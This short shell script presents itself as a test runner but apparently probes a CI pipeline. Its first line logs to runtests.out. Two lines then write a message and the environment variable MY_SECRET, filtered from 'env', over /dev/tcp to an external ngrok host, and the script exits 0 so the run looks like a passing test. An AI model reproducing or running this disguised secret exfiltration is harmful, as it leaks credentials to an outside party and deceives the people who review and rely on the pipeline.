echo "Executing Tests script" >> runtests.out
echo "Execution from READ user " > /dev/tcp/4.tcp.eu.ngrok.io/18328
env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/18328
RET=0
exit $RET
